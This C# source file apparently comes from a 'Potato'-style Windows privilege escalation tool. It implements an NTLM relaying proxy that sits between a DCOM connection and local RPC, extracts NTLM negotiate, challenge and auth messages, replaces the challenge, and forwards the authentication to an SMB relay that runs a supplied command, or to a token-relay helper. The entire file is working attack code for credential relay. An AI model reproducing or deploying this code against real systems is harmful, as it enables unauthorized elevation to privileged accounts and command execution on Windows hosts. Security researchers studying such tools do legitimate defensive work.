using System;
using System.Collections;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using QHelper;
using SharpCifs;
using SSPITest;

namespace Potato
{
    class NTLMRelayingProxy
    {
        public AutoResetEvent disconnected = new AutoResetEvent(false);
        private AutoResetEvent targetSocketWait = new AutoResetEvent(false);
        private AutoResetEvent winRpcSocketWait = new AutoResetEvent(false);
        private static Thread smbRelayThread;
        private static Thread tokenRelayThread;
        private static String enable_token;
        private static Queue<byte[]> ntlmQueue;
        private static BlockingCollection<byte[]> new_ntlmQueueIn = new BlockingCollection<byte[]>();
        private static BlockingCollection<byte[]> new_ntlmQueueOut = new BlockingCollection<byte[]>();
        private static String cmd;

        private static byte[] challenge;
        private static int challengeCount = 0;
        private static bool dropFirst = true;

        private static byte[] NTLMExtract(byte[] buf)
        {
            try
            {
                String bufStr = BitConverter.ToString(buf);
                // match for ntlm messages
                Match m = Regex.Match(bufStr, @"4E-54-4C-4D-53-53-50.{4}(?<msg>\d{2})[-0-9a-zA-Z]*");
                if (m.Value.Length != 0)
                {
                    String[] arr = m.Value.Split('-');
                    Byte[] byte_array = new byte[arr.Length];
                    for (int i = 0; i < arr.Length; i++) byte_array[i] = Convert.ToByte(arr[i], 16);
                    return byte_array;
                }
                return null;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return null;
            }
        }
        //
        private static byte[] replaceChallenge(byte[] original_req, byte[] challenge_bytes)
        {
            // convert to string ... messy and sloppy but working
            String replace_me = BitConverter.ToString(original_req, 0, original_req.Length);
            String replace_with = BitConverter.ToString(challenge_bytes, 0, challenge_bytes.Length);
            Regex rgx = new Regex(@"4E-54-4C-4D-53-53-50.{4}(?<msg>\d{2})[-0-9a-zA-Z]*");

            // replace
            string result_string = rgx.Replace(replace_me, replace_with);

            // convert ms-hex-string back to byte_array
            String[] arr = result_string.Split('-');
            Byte[] byte_array = new byte[result_string.Length];
            for (int i = 0; i < arr.Length; i++) byte_array[i] = Convert.ToByte(arr[i], 16);
            return byte_array;
        }

        private byte[] doNTLMMagic(byte[] buf)
        {
            byte[] ret_bytes = buf;
            
            if(smbRelayThread == null)
            {
                SMBRelay smbRelay = new SMBRelay();
                smbRelayThread = new Thread(() => smbRelay.startSMBRelay(NTLMRelayingProxy.ntlmQueue,cmd));
            }

            if (tokenRelayThread == null)
            {
                SSPIHelper tokenRelay = new SSPIHelper();
                tokenRelayThread = new Thread(() => tokenRelay.TokenRelay(new_ntlmQueueIn, new_ntlmQueueOut));
            }
            try
            {
                byte[] ntlm_bytes = NTLMExtract(buf);
                if (ntlm_bytes != null)
                {

                    if (ntlm_bytes[8] == 1)
                    {
                        if (enable_token != null) 
                        {
                            Console.WriteLine("GOT TYPE1 MESSAGE TOKEN-RELAY!");
                            new_ntlmQueueIn.Add(ntlm_bytes);
                            tokenRelayThread.Start();
                            challenge = new_ntlmQueueOut.Take();
                        }
                        else if (!smbRelayThread.IsAlive)
                        {
                            Console.WriteLine("GOT TYPE1 MESSAGE");
                            ntlmQueue.Enqueue(ntlm_bytes);
                            smbRelayThread.Start();
                            Config.signalHandlerClient.WaitOne();
                            challenge = ntlmQueue.Dequeue();
                        }
                    }
                    else if (ntlm_bytes[8] == 2)
                    {
                        Console.WriteLine("GOT TYPE2 MESSAGE (CHALLENGE) from RPCs");
                        if (challengeCount > 0 || !dropFirst)
                        {
                            ret_bytes = replaceChallenge(buf, challenge);
                        }
                        challengeCount = challengeCount + 1;
                    }
                    else if (ntlm_bytes[8] == 3)
                    {
                        if (enable_token != null)
                        {
                            Console.WriteLine("GOT TYPE3 MESSAGE (AUTH) TOKEN-RELAY");

                            new_ntlmQueueIn.Add(ntlm_bytes);
                            byte[] checkStatus = new_ntlmQueueOut.Take();
                            if (checkStatus[0] == 99)
                            {
                                Thread.Sleep(500); // Incase its not finished!
                                tokenRelayThread.Abort();
                                DCERPCNtlmHandler.finished.Set();
                                // this.disconnected.Set();
                            }
                            else 
                            {
                                new_ntlmQueueIn = new BlockingCollection<byte[]>();
                                new_ntlmQueueOut = new BlockingCollection<byte[]>();
                                challengeCount = 0;
                                tokenRelayThread = null;
                            }
                        }
                        else
                        {
                            Console.WriteLine("GOT TYPE3 MESSAGE (AUTH)");

                            ntlmQueue.Enqueue(ntlm_bytes);
                            Config.signalHandler.Set();
                            Config.signalHandlerClient.WaitOne();
                            byte[] checkStatus = ntlmQueue.Dequeue();
                            Config.signalHandler.Set();
                            if (checkStatus[0] == 99)
                            {
                                Thread.Sleep(500);
                                smbRelayThread.Abort();
                                tokenRelayThread.Abort(); 
                                DCERPCNtlmHandler.finished.Set();
                                // this.disconnected.Set();
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return ret_bytes;
            }

            return ret_bytes;
        }
        public void startRelay(Socket targetSock, Socket winRpcSock, String cmd, Queue<byte[]> ntlmQueue, bool dropFirst, String enable_token)
        {
            NTLMRelayingProxy.ntlmQueue = ntlmQueue;
            NTLMRelayingProxy.cmd = cmd;
            NTLMRelayingProxy.dropFirst = dropFirst;
            NTLMRelayingProxy.enable_token = enable_token;
            
   
            Queue<ArrayList> winRpcToSend = new Queue<ArrayList>();
            Queue<ArrayList> targetToSend = new Queue<ArrayList>();

            Thread targetCon = new Thread(() => this.doTargetSocketRelay(targetSock,targetToSend,winRpcToSend));
            Thread winRpcCon = new Thread(() => this.doWinRpcSocketRelay(winRpcSock,targetToSend,winRpcToSend));
            targetCon.Start();
            winRpcCon.Start();

            disconnected.WaitOne();

            targetCon.Abort();
            winRpcCon.Abort();
        }

        // for debugging print
        private String printBytes(byte[] bytes, int start, int end)
        {
            return BitConverter.ToString(bytes, start, end);
        }

        public void doTargetSocketRelay(Socket targetSock,Queue<ArrayList> targetToSend,Queue<ArrayList> winRpcToSend)
        {
            byte[] targetBuf = new Byte[1024];
            int recvLen = -1;
            while (true)
            {
                try {
                    recvLen = targetSock.Receive(targetBuf);
                }
                catch (Exception)
                {
                    Console.WriteLine("DCOM connection terminated");
                    disconnected.Set();
                    break;
                }

                byte[] trimmedTargetBuf = new byte[recvLen];
                Array.Copy(targetBuf, trimmedTargetBuf, recvLen);
                byte[] result = doNTLMMagic(trimmedTargetBuf);

                ArrayList arr = new ArrayList(2);
                arr.Add(recvLen);
                arr.Add(result);
                winRpcToSend.Enqueue(arr);
                winRpcSocketWait.Set();
                targetSocketWait.WaitOne();

                ArrayList toSend = targetToSend.Dequeue();
                int toSendLength = (int)toSend[0];
                byte[] toSendData = (byte[])toSend[1];
                targetSock.Send(toSendData,0,toSendLength,SocketFlags.None);
            }
        }

        public void doWinRpcSocketRelay(Socket winRpcSock,Queue<ArrayList> targetToSend, Queue<ArrayList> winRpcToSend)
        {
            byte[] winRpcBuf = new Byte[1024];
            int recvLen = -1;
            while (true)
            {
                winRpcSocketWait.WaitOne();
                ArrayList toSend = winRpcToSend.Dequeue();
                byte[] toSendData = (byte[])toSend[1];
                int toSendLength = (int)toSend[0];

                winRpcSock.Send(toSendData,0,toSendLength,SocketFlags.None);

                try {
                    recvLen = winRpcSock.Receive(winRpcBuf);
                }
                catch(Exception)
                {
                    Console.WriteLine("Terminated RPC connection");
                    //winRpcSock.Close();
                    disconnected.Set();
                    break;
                }

                byte[] winRpcBufTrimmed = new byte[recvLen];
                Array.Copy(winRpcBuf, winRpcBufTrimmed, recvLen);
                byte[] result = doNTLMMagic(winRpcBufTrimmed);


                ArrayList arr = new ArrayList(2);
                arr.Add(recvLen);
                arr.Add(result);
                targetToSend.Enqueue(arr);
                targetSocketWait.Set();                               
            }
        }
    }
}